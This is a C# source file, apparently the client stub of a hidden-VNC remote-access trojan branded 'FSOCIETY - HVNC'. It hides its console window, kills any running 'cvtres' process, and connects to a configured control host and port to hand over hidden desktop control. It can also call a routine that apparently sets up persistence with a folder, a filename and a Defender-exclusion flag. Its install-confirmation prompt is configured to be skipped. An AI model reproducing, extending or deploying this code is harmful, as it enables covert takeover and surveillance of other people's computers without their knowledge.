using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
internal class Program
{
	public const int SW_HIDE = 0;

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetConsoleWindow();

	[DllImport("user32.dll")]
	public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	public static void Main(string[] args)
	{
		ShowWindow(GetConsoleWindow(), 0);
		string anddressIP = "127.0.0.1";
		string anddressPort = "9090";
		string identifier = "Andromeda";
		string mutex = "YzpcKpvwT.exe";
		string text = "False";
		string path = "1";
		string folder = "igCLtbvQ";
		string filename = "igCLtbvQ";
		string wdex = "False";
		string text2 = "True";
		if (text2 == "False")
		{
			switch (MessageBox.Show("Do You Want To Install FSOCIETY?", "FSOCIETY - HVNC", MessageBoxButtons.YesNo, MessageBoxIcon.Question))
			{
			case DialogResult.Yes:
			{
				if (Process.GetProcessesByName("cvtres").Length == 0)
				{
					unnokw_hvnc.StartHVNC(anddressIP + " " + anddressPort, identifier, mutex);
					if (text == "True")
					{
						unnokw_at.Run(path, folder, filename, wdex);
					}
					break;
				}
				Process[] processes = Process.GetProcesses();
				Process[] array = processes;
				foreach (Process process in array)
				{
					if (process.ProcessName == "cvtres")
					{
						process.Kill();
						break;
					}
				}
				unnokw_hvnc.StartHVNC(anddressIP + " " + anddressPort, identifier, mutex);
				if (text == "True")
				{
					unnokw_at.Run(path, folder, filename, wdex);
				}
				break;
			}
			case DialogResult.No:
				Environment.Exit(0);
				break;
			}
		}
		else
		{
			if (!(text2 == "True"))
			{
				return;
			}
			if (Process.GetProcessesByName("cvtres").Length == 0)
			{
				unnokw_hvnc.StartHVNC(anddressIP + " " + anddressPort, identifier, mutex);
				if (text == "True")
				{
					unnokw_at.Run(path, folder, filename, wdex);
				}
				return;
			}
			Process[] processes2 = Process.GetProcesses();
			Process[] array2 = processes2;
			foreach (Process process2 in array2)
			{
				if (process2.ProcessName == "cvtres")
				{
					process2.Kill();
					break;
				}
			}
			unnokw_hvnc.StartHVNC(anddressIP + " " + anddressPort, identifier, mutex);
			if (text == "True")
			{
				unnokw_at.Run(path, folder, filename, wdex);
			}
		}
	}
}
